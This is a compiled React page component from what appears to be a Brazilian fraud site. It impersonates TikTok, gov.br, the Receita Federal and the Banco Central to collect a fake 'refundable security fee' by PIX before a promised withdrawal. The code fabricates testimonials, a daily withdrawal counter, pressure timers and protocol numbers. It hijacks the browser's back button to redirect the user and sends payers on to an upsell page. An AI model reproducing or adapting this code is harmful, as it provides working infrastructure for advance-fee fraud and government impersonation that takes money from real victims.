import {p as T, s as $, r as l, j as e, C as F, v as Y, w as I} from "./index-CJ4HKgLV.js";
import {u as A, L as k} from "./use-pix-payment-BngzPisj.js";
import {c as _} from "./coin-p-BTqgdHPT.js";
import {r as V} from "./receita-federal-new-C9waySsF.js";
import {C} from "./clock-BPlFhknE.js";
import {S as M} from "./shield-check-C2p4pIjt.js";
import {L as X} from "./lock-COKEO8SK.js";

const O = "/assets/govbr-logo-DUdxlXZj.png",
      J = "/assets/tiktok-logo-CtJns-A9.png",
      K = "/assets/testimonial-lucas-DVva3n8g.jpeg",
      Q = "/assets/testimonial-rafael-CZLwIeTm.jpeg",
      U = "/assets/testimonial-amanda-DWOXdEcF.jpeg",
      W = "/assets/testimonial-carla-Fb5od0Tc.jpeg",
      Z = "/assets/social-proof-1-wtJu8RKO.jpeg",
      H = "/assets/social-proof-2-Bexutqu7.jpeg",
      G = "/assets/social-proof-3-CQJriiT6.jpeg",
      ee = "/assets/social-proof-4-rJbdLVAM.jpeg";

// 🔧 Correção: Nome da função de timer ajustado para regras do React
const useTimer = i => {
    const [r,u] = l.useState(i * 60);
    l.useEffect( () => {
        if (r <= 0) return;
        const x = setInterval( () => u(a => Math.max(0, a - 1)), 1e3);
        return () => clearInterval(x);
    }, [r]);
    const d = Math.floor(r / 60), c = r % 60;
    return `${String(d).padStart(2, "0")}:${String(c).padStart(2, "0")}`;
};

// 🔧 Correção: Tratamento de CPF para evitar crash de tela branca
const se = i => {
    if (!i || String(i).length < 11) return null;
    const r = String(i).replace(/\D/g, "");
    return r.length !== 11 ? null : `***.${r.slice(3, 6)}.${r.slice(6, 9)}-**`;
};

const xe = () => {
    var w;
    const i = T(), r = $(), u = useTimer(10);
    const {amount: d, pixKeyType: c, pixKey: x, customerData: a} = r.state || {
        amount: "10",
        pixKeyType: "email",
        pixKey: ""
    };
    const E = { amount: d, pixKeyType: c, pixKey: x, customerData: a };
    const h = () => {
        i("/back-redirect", { state: E, replace: !0 });
    };

    l.useEffect( () => {
        window.history.pushState(null, "", window.location.href);
        const t = () => { h(); };
        return window.addEventListener("popstate", t),
        () => window.removeEventListener("popstate", t);
    }, []);

    const [s,R] = l.useState(!1);
    const [P,ae] = l.useState(!0);
    
    // 🔧 Variável que recebe o valor do PIX gerado pelo backend
    const [pixAmount, setPixAmount] = l.useState(null);

    const m = Number(d);
    const B = Number(pixAmount ?? 3222); // Centavos
    const p = B / 100; // Valor final em Reais

    const g = ((w = a == null ? void 0 : a.name) == null ? void 0 : w.split(" ")[0]) || "";
    const j = se(a == null ? void 0 : a.document);
    
    const b = l.useMemo( () => {
        const t = Math.random().toString(36).substring(2, 8).toUpperCase();
        return `TT-${new Date().getFullYear()}-${t}`;
    }, []);

    const {loading: N, pixData: o, copied: v, pixTimer: y, pixRef: S, handlePay: z, handleCopy: L} = A({
        amountInCents: B,
        redirectTo: "/upsell-1",
        customerData: a,
        extraState: { amount: d, pixKeyType: c, pixKey: x, customerData: a }
    });

    l.useEffect( () => {
        const t = setTimeout( () => R(!0), 100);
        return () => clearTimeout(t);
    }, []);

    // 🔧 Atualiza a tela com o valor real vindo da API
    l.useEffect(() => {
        if (o?.amount) { setPixAmount(o.amount); }
    }, [o]);

    const n = t => `R$ ${t.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
    const q = new Date().toLocaleDateString("pt-BR");
    const D = { cpf: "CPF", email: "E-mail", phone: "Celular", random: "Chave aleatória" };

    return e.jsxs("div", {
        className: "min-h-screen bg-[#F5F5F5] max-w-[430px] mx-auto pb-8",
        children: [e.jsxs("header", {
            className: "h-[56px] flex items-center justify-between px-4 bg-white sticky top-0 z-50 shadow-sm",
            children: [e.jsx(F, {
                size: 24,
                className: "text-foreground cursor-pointer active:scale-90 transition-transform",
                onClick: h
            }), e.jsx("h1", {
                className: "font-bold text-[17px] text-foreground",
                children: "Confirmação de saque"
            }), e.jsx("div", {
                className: "w-6"
            })]
        }), e.jsxs("div", {
            className: "flex items-center justify-center gap-2 py-2 bg-white border-b border-[#F0F0F0]",
            children: [e.jsx(C, {
                size: 14,
                className: "text-pink"
            }), e.jsx("span", {
                className: "text-[13px] text-muted-foreground",
                children: "Tempo restante:"
            }), e.jsx("span", {
                className: "text-[14px] font-bold text-pink",
                style: { fontVariantNumeric: "tabular-nums" },
                children: u
            })]
        }), j && e.jsxs("div", {
            className: "mx-4 mt-3 bg-green-500/10 border border-green-500/20 rounded-[12px] py-2.5 px-4 flex items-center gap-2 transition-all duration-500 ease-out",
            style: { opacity: s ? 1 : 0, transform: s ? "translateY(0)" : "translateY(8px)" },
            children: [e.jsx(M, {
                size: 15,
                className: "text-green-500 shrink-0"
            }), e.jsxs("p", {
                className: "text-foreground text-[12px]",
                children: ["CPF ", e.jsx("span", { className: "font-bold", children: j }), " pré-aprovado para saque imediato"]
            })]
        }), e.jsx("div", {
            className: "mx-4 mt-2 flex items-center justify-center",
            children: e.jsxs("p", {
                className: "text-muted-foreground/60 text-[10px]",
                children: ["Protocolo: ", e.jsx("span", { className: "font-mono font-semibold", children: b })]
            })
        }), e.jsxs("div", {
            className: "mx-4 mt-2 relative transition-all duration-700 ease-out",
            style: { opacity: s ? 1 : 0, transform: s ? "translateY(0)" : "translateY(12px)" },
            children: [e.jsxs("div", {
                className: "bg-foreground rounded-t-[16px] p-5 pb-5 relative overflow-hidden",
                children: [e.jsx("p", {
                    className: "text-white/80 text-[14px]",
                    children: g ? `${g}, seu saldo` : "Saldo disponível"
                }), e.jsx("p", {
                    className: "text-white text-[38px] font-extrabold leading-tight tracking-tight mt-1",
                    style: { fontVariantNumeric: "tabular-nums" },
                    children: n(m)
                }), e.jsx("p", {
                    className: "text-white/60 text-[13px]",
                    children: "Aguardando confirmação para saque"
                }), e.jsx("img", {
                    src: _, alt: "", width: 90, height: 90, className: "absolute right-4 top-3 w-[90px] h-[90px]",
                    style: { opacity: s ? 1 : 0, transform: s ? "rotate(0deg) scale(1)" : "rotate(-90deg) scale(0.5)", transition: "all 1s ease-out" }
                })]
            }), e.jsxs("div", {
                className: "relative bg-foreground",
                children: [e.jsx("div", {
                    className: "absolute left-0 top-1/2 -translate-y-1/2 -translate-x-1/2 w-[20px] h-[20px] rounded-full bg-[#F5F5F5]"
                }), e.jsx("div", {
                    className: "absolute right-0 top-1/2 -translate-y-1/2 translate-x-1/2 w-[20px] h-[20px] rounded-full bg-[#F5F5F5]"
                }), e.jsx("div", {
                    className: "border-t-[2px] border-dashed border-white/20 mx-5"
                })]
            }), e.jsxs("div", {
                className: "bg-foreground rounded-b-[16px] px-5 py-3 flex items-center justify-between",
                children: [e.jsx("span", {
                    className: "text-white/70 text-[13px]",
                    children: "Suas transações: R$ 0,03"
                }), e.jsx(F, {
                    size: 18,
                    className: "text-white/70 rotate-180"
                })]
            })]
        }), e.jsxs("div", {
            className: "mx-4 mt-4 bg-white rounded-[16px] p-5 transition-all duration-500 ease-out",
            style: { opacity: s ? 1 : 0, transform: s ? "translateY(0)" : "translateY(16px)", transitionDelay: "150ms" },
            children: [e.jsx("p", {
                className: "text-muted-foreground text-[12px] uppercase tracking-wide font-bold mb-3",
                children: "Contribuição de segurança"
            }), e.jsxs("div", {
                className: "flex items-center gap-3 mb-3",
                children: [e.jsx("span", {
                    className: "text-[#10B981] text-[28px] font-extrabold",
                    children: n(p)
                }), e.jsx("span", {
                    className: "text-[#10B981] text-[11px] font-bold border border-[#10B981] rounded-full px-2.5 py-0.5 animate-pulse",
                    children: "100% REEMBOLSÁVEL"
                })]
            }), e.jsxs("p", {
                className: "text-muted-foreground text-[14px] leading-relaxed",
                children: ["Contribuição de segurança exigida pelo Banco Central para liberação do saque de ", e.jsx("strong", {
                    className: "text-foreground",
                    children: n(m)
                }), ". O valor de ", e.jsx("strong", {
                    className: "text-foreground",
                    children: n(p)
                }), " será devolvido integralmente na sua chave Pix em 1 minuto."]
            }), e.jsxs("div", {
                className: "mt-3 bg-[#F9FAFB] rounded-[10px] p-3 space-y-1.5",
                children: [e.jsx("p", {
                    className: "text-muted-foreground text-[10px] uppercase tracking-wider font-bold mb-1",
                    children: "Composição da taxa"
                }), e.jsxs("div", {
                    className: "flex items-center justify-between",
                    children: [e.jsx("span", {
                        className: "text-muted-foreground text-[12px]",
                        children: "Validação BCB"
                    }), e.jsx("span", {
                        className: "text-foreground text-[12px] font-semibold",
                        children: "R$ 18,10"
                    })]
                }), e.jsxs("div", {
                    className: "flex items-center justify-between",
                    children: [e.jsx("span", {
                        className: "text-muted-foreground text-[12px]",
                        children: "Seguro antifraude"
                    }), e.jsx("span", {
                        className: "text-foreground text-[12px] font-semibold",
                        children: "R$ 18,10"
                    })]
                }), e.jsxs("div", {
                    className: "border-t border-[#E5E7EB] pt-1.5 flex items-center justify-between",
                    children: [e.jsx("span", {
                        className: "text-foreground text-[12px] font-bold",
                        children: "Total (reembolsável)"
                    }), e.jsx("span", {
                        className: "text-[#10B981] text-[12px] font-bold",
                        children: n(p)
                    })]
                })]
            })]
        }), !o && e.jsx("div", {
            className: "mx-4 mt-4 bg-white rounded-[16px] p-4 transition-all duration-500 ease-out",
            style: { opacity: s ? 1 : 0, transform: s ? "translateY(0)" : "translateY(16px)", transitionDelay: "250ms" },
            children: e.jsxs("div", {
                className: "flex items-center justify-between",
                children: [e.jsxs("div", {
                    className: "flex flex-col items-center flex-1",
                    children: [e.jsx("div", {
                        className: "w-[32px] h-[32px] rounded-full bg-pink flex items-center justify-center",
                        children: e.jsx("span", {
                            className: "text-white text-[11px] font-bold",
                            children: "1"
                        })
                    }), e.jsxs("p", {
                        className: "text-foreground text-[10px] font-bold mt-1.5 text-center leading-tight",
                        children: ["Pagar", e.jsx("br", {}), n(p)]
                    })]
                }), e.jsx("div", {
                    className: "h-[2px] bg-[#E5E7EB] flex-1 mx-1 mt-[-16px]"
                }), e.jsxs("div", {
                    className: "flex flex-col items-center flex-1",
                    children: [e.jsx("div", {
                        className: "w-[32px] h-[32px] rounded-full bg-[#E5E7EB] flex items-center justify-center",
                        children: e.jsx("span", {
                            className: "text-muted-foreground text-[11px] font-bold",
                            children: "2"
                        })
                    }), e.jsxs("p", {
                        className: "text-muted-foreground text-[10px] mt-1.5 text-center leading-tight",
                        children: ["Reembolso", e.jsx("br", {}), "em 1 min"]
                    })]
                }), e.jsx("div", {
                    className: "h-[2px] bg-[#E5E7EB] flex-1 mx-1 mt-[-16px]"
                }), e.jsxs("div", {
                    className: "flex flex-col items-center flex-1",
                    children: [e.jsx("div", {
                        className: "w-[32px] h-[32px] rounded-full bg-[#E5E7EB] flex items-center justify-center",
                        children: e.jsx("span", {
                            className: "text-muted-foreground text-[11px] font-bold",
                            children: "3"
                        })
                    }), e.jsxs("p", {
                        className: "text-muted-foreground text-[10px] mt-1.5 text-center leading-tight",
                        children: [n(m), e.jsx("br", {}), "na conta"]
                    })]
                })]
            })
        }), e.jsxs("div", {
            className: "mx-4 mt-4 bg-white rounded-[16px] p-5 transition-all duration-500 ease-out",
            style: { opacity: s ? 1 : 0, transform: s ? "translateY(0)" : "translateY(16px)", transitionDelay: "300ms" },
            children: [e.jsx("p", {
                className: "text-muted-foreground text-[12px] uppercase tracking-wide font-bold mb-4",
                children: "Dados para reembolso"
            }), e.jsxs("div", {
                className: "flex items-center justify-between py-3 border-b border-[#F0F0F0]",
                children: [e.jsx("span", {
                    className: "text-muted-foreground text-[15px]",
                    children: "Data"
                }), e.jsx("span", {
                    className: "font-semibold text-[15px] text-foreground",
                    children: q
                })]
            }), e.jsxs("div", {
                className: "flex items-center justify-between py-3 border-b border-[#F0F0F0]",
                children: [e.jsx("span", {
                    className: "text-muted-foreground text-[15px]",
                    children: "Chave PIX"
                }), e.jsx("span", {
                    className: "font-semibold text-[15px] text-foreground",
                    children: D[c] || c
                })]
            }), e.jsxs("div", {
                className: "flex items-center justify-between py-3 border-b border-[#F0F0F0]",
                children: [e.jsx("span", {
                    className: "text-muted-foreground text-[15px]",
                    children: "Valor a receber"
                }), e.jsx("span", {
                    className: "font-bold text-[15px] text-foreground",
                    children: n(m)
                })]
            }), e.jsx("button", {
                className: "w-full h-[48px] bg-[#F0F0F0] text-foreground font-semibold text-[15px] rounded-[10px] mt-4",
                children: x
            })]
        }), e.jsx("div", {
            className: "mx-4 my-4 border-t border-[#E5E7EB]"
        }), o && e.jsxs("div", {
            ref: S,
            className: "mx-4 mb-4 bg-white rounded-[16px] p-5 transition-all duration-500 ease-out",
            children: [e.jsx("div", {
                className: "flex justify-center mb-3",
                children: e.jsx("img", {
                    src: J, alt: "TikTok", loading: "lazy", width: 28, height: 28, className: "h-[28px] object-contain"
                })
            }), e.jsx("p", {
                className: "text-muted-foreground text-[12px] uppercase tracking-wide font-bold mb-4 text-center",
                children: "Pague com PIX"
            }), o.qr_code_base64 ? e.jsx("div", {
                className: "flex justify-center mb-4",
                children: e.jsx("img", {
                    src: o.qr_code_base64, alt: "QR Code PIX", className: "w-[200px] h-[200px] rounded-[12px]"
                })
            }) : o.qr_code ? e.jsx("div", {
                className: "flex justify-center mb-4",
                children: e.jsx("img", {
                    src: `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(o.qr_code)}`, alt: "QR Code PIX", className: "w-[200px] h-[200px] rounded-[12px]"
                })
            }) : null, e.jsx("p", {
                className: "text-muted-foreground text-[12px] text-center mb-3",
                children: "Ou copie o código PIX abaixo:"
            }), o?.amount && e.jsx("div", {
                className: "text-center font-extrabold text-[18px] text-pink mb-3",
                children: "Valor: R$ " + (o.amount / 100).toFixed(2).replace(".", ",")
            }), e.jsx("div", {
                className: "relative",
                children: e.jsx("div", {
                    className: "w-full bg-[#F5F5F5] rounded-[10px] p-3 text-[12px] text-foreground break-all leading-relaxed max-h-[80px] overflow-y-auto",
                    children: o.qr_code
                })
            }), e.jsxs("button", {
                onClick: L,
                className: "w-full h-[48px] bg-pink text-white font-bold text-[15px] rounded-[12px] mt-3 flex items-center justify-center gap-2 active:scale-[0.98] transition-all",
                children: [v ? e.jsx(Y, { size: 18 }) : e.jsx(I, { size: 18 }), v ? "Código copiado!" : "Copiar código PIX"]
            }), y && e.jsxs("p", {
                className: "text-pink text-[13px] text-center mt-3 font-bold",
                style: { fontVariantNumeric: "tabular-nums" },
                children: ["Expira em: ", y]
            })]
        }), !o && e.jsxs("div", {
            className: "mx-4 bg-white rounded-[16px] p-4 transition-all duration-500 ease-out space-y-3",
            style: { opacity: s ? 1 : 0, transform: s ? "translateY(0)" : "translateY(16px)", transitionDelay: "400ms" },
            children: [e.jsx("p", {
                className: "text-muted-foreground text-[11px] uppercase tracking-wider font-bold text-center mb-1",
                children: "Quem já sacou hoje"
            }), [{
                img: K, name: "Lucas M.", city: "São Paulo", value: "R$ 2.800", time: "há 12 min", text: "paguei achando q era cilada kkk mas o reembolso veio antes do saque, nunca mais duvido"
            }, {
                img: U, name: "Amanda S.", city: "Rio de Janeiro", value: "R$ 1.450", time: "há 28 min", text: "gente eu tava morrendo de medo mas fiz e caiu certinho, obrigada tiktok por essa oportunidade serio"
            }, {
                img: Q, name: "Rafael O.", city: "Belo Horizonte", value: "R$ 3.200", time: "há 43 min", text: "terceira vez sacando ja, toda vez cai em menos de 2 min, nao tem erro nenhum"
            }, {
                img: W, name: "Carla F.", city: "Curitiba", value: "R$ 980", time: "há 1h", text: "quase nao fiz por causa da taxa mas devolveram tao rapido q nem deu tempo de me arrepender kkk"
            }].map( (t, f) => e.jsxs("div", {
                className: "flex gap-3 items-start py-2 border-b border-[#F0F0F0] last:border-0",
                children: [e.jsx("img", {
                    src: t.img, alt: t.name, className: "w-[40px] h-[40px] rounded-full object-cover shrink-0"
                }), e.jsxs("div", {
                    className: "flex-1 min-w-0",
                    children: [e.jsxs("div", {
                        className: "flex items-center justify-between",
                        children: [e.jsx("span", {
                            className: "text-foreground text-[13px] font-semibold",
                            children: t.name
                        }), e.jsxs("span", {
                            className: "text-[#10B981] text-[11px] font-bold",
                            children: [t.value, " ✓"]
                        })]
                    }), e.jsxs("p", {
                        className: "text-foreground text-[12px] italic leading-snug mt-0.5",
                        children: ['"', t.text, '"']
                    }), e.jsxs("p", {
                        className: "text-muted-foreground text-[10px] mt-0.5",
                        children: [t.city, " · ", t.time]
                    })]
                })]
            }, f)), e.jsxs("div", {
                className: "flex items-center justify-center gap-1.5 pt-1",
                children: [e.jsx("div", {
                    className: "flex -space-x-2",
                    children: [Z, H, G, ee].map( (t, f) => e.jsx("img", {
                        src: t, alt: "", loading: "lazy", className: "w-[22px] h-[22px] rounded-full object-cover border-2 border-white", style: { imageRendering: "pixelated" }
                    }, f))
                }), e.jsx("span", {
                    className: "text-muted-foreground text-[11px] ml-1",
                    children: "+8.432 saques confirmados hoje"
                })]
            })]
        }), e.jsx("div", {
            className: "mx-4 mt-4 bg-white rounded-[16px] p-5 transition-all duration-500 ease-out",
            style: { opacity: s ? 1 : 0, transform: s ? "translateY(0)" : "translateY(16px)", transitionDelay: "500ms" },
            children: o ? e.jsxs("div", {
                className: "flex items-center justify-center gap-2",
                children: [e.jsx(k, {
                    size: 16, className: "animate-spin text-pink"
                }), e.jsx("span", {
                    className: "text-muted-foreground text-[14px] font-medium",
                    children: "Aguardando pagamento..."
                })]
            }) : e.jsxs(e.Fragment, {
                children: [e.jsx("button", {
                    onClick: z,
                    disabled: N || !P,
                    className: "w-full h-[56px] bg-pink text-white font-bold text-[16px] rounded-[14px] flex items-center justify-center gap-2 active:scale-[0.98] transition-all duration-150 shadow-[0_4px_14px_rgba(255,59,108,0.3)] disabled:opacity-50",
                    children: N ? e.jsx(k, {
                        size: 22, className: "animate-spin"
                    }) : e.jsxs(e.Fragment, {
                        children: [e.jsx(X, { size: 17 }), "CONFIRMAR E LIBERAR ", n(m)]
                    })
                }), e.jsxs("div", {
                    className: "flex items-center justify-center gap-1.5 mt-3",
                    children: [e.jsx(C, {
                        size: 14, className: "text-[#10B981]"
                    }), e.jsxs("span", {
                        className: "text-[#10B981] text-[13px] font-semibold",
                        children: ["Reembolso de ", n(p), " em 1 minuto"]
                    })]
                })]
            })
        }), e.jsxs("div", {
            className: "flex items-center justify-center gap-8 mt-6 mb-2 px-4",
            children: [e.jsx("img", {
                src: O, alt: "gov.br", loading: "lazy", width: 28, height: 28, className: "h-[28px] object-contain"
            }), e.jsx("img", {
                src: V, alt: "Receita Federal", loading: "lazy", width: 50, height: 50, className: "h-[50px] object-contain"
            })]
        }), e.jsxs("div", {
            className: "mx-4 mt-4 border-t border-[#E5E7EB] pt-4 pb-6",
            children: [e.jsx("p", {
                className: "text-muted-foreground text-[13px] text-center",
                children: "Processo 100% seguro"
            }), e.jsxs("p", {
                className: "text-muted-foreground/50 text-[9px] text-center mt-1",
                children: ["Protocolo ", b]
            }), e.jsx("p", {
                className: "text-pink text-[13px] text-center font-semibold mt-1 cursor-pointer",
                onClick: () => i("/faq"),
                children: "Precisa de ajuda?"
            })]
        })]
    });
};
export {xe as default};
